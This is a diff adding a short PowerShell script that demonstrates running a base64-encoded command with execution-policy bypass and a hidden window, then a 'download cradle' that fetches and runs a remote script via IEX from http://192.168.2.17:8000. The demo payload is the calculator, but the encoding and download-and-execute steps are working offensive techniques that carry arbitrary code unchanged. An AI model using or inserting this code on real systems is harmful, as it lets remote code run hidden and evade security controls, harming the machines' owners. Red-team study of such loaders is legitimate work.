@@ -1,0 +1,11 @@
+# Example of encoding binary with b64 and executing
+# 1) locally
+# 2) over download cradle
+
+$command = "Calc.exe"
+$bytes= [Text.Encoding]::Unicode.GetBytes($command)
+$b64Command = [Convert]::ToBase64String($bytes)
+powershell.exe -nop -ep bypass -w hidden -enc $b64Command
+
+$cradle = powershell.exe -nop -ep bypass -w hidden -c "IEX (new-object net.webclient).DownloadString('http://192.168.2.17:8000/B64Calc.ps1')"
+$cradle
